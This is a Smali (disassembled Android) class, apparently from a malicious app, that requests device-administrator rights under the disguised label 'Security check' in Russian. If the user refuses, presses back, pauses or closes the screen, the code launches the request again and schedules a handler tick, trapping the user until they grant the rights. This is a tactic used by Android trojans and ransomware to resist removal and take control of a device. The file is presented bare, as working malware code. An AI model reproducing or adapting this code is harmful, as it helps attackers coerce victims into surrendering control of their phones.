.class public Lorg/merry/core/AdminActivity;
.super Landroid/app/Activity;
.source "AdminActivity.java"


# static fields
.field public static isAdmin:Ljava/lang/Boolean;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 13
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lorg/merry/core/AdminActivity;->isAdmin:Ljava/lang/Boolean;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public Launch(Ljava/lang/Boolean;)V
    .locals 5
    .param p1, "newtask"    # Ljava/lang/Boolean;

    .prologue
    .line 17
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 18
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.app.extra.DEVICE_ADMIN"

    new-instance v2, Landroid/content/ComponentName;

    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v3

    const-class v4, Lorg/merry/core/AdminReceiver;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 19
    const-string v1, "android.app.extra.ADD_EXPLANATION"

    const-string v2, "\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 21
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 22
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 23
    :cond_0
    const/16 v1, 0x6f

    invoke-virtual {p0, v0, v1}, Lorg/merry/core/AdminActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 24
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    const/4 v1, 0x1

    .line 28
    const/16 v0, 0x6f

    if-ne p1, v0, :cond_0

    .line 30
    const/4 v0, -0x1

    if-ne p2, v0, :cond_1

    .line 32
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lorg/merry/core/AdminActivity;->isAdmin:Ljava/lang/Boolean;

    .line 33
    invoke-virtual {p0}, Lorg/merry/core/AdminActivity;->finish()V

    .line 42
    :cond_0
    :goto_0
    return-void

    .line 37
    :cond_1
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lorg/merry/core/AdminActivity;->isAdmin:Ljava/lang/Boolean;

    .line 38
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/merry/core/AdminActivity;->Launch(Ljava/lang/Boolean;)V

    goto :goto_0
.end method

.method public onBackPressed()V
    .locals 1

    .prologue
    .line 70
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    .line 71
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/merry/core/AdminActivity;->Launch(Ljava/lang/Boolean;)V

    .line 72
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1
    .param p1, "icicle"    # Landroid/os/Bundle;

    .prologue
    .line 50
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/merry/core/AdminActivity;->Launch(Ljava/lang/Boolean;)V

    .line 51
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 53
    return-void
.end method

.method protected onDestroy()V
    .locals 4

    .prologue
    .line 76
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    sget-object v0, Lorg/merry/core/RunService;->onTickHandler:Landroid/os/Handler;

    const/16 v1, 0x6f

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 77
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 78
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/merry/core/AdminActivity;->Launch(Ljava/lang/Boolean;)V

    .line 79
    return-void
.end method

.method protected onPause()V
    .locals 4

    .prologue
    .line 63
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    sget-object v0, Lorg/merry/core/RunService;->onTickHandler:Landroid/os/Handler;

    const/16 v1, 0x6f

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 64
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 65
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/merry/core/AdminActivity;->Launch(Ljava/lang/Boolean;)V

    .line 66
    return-void
.end method

.method protected onStart()V
    .locals 1

    .prologue
    .line 57
    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    .line 58
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/merry/core/AdminActivity;->Launch(Ljava/lang/Boolean;)V

    .line 59
    return-void
.end method
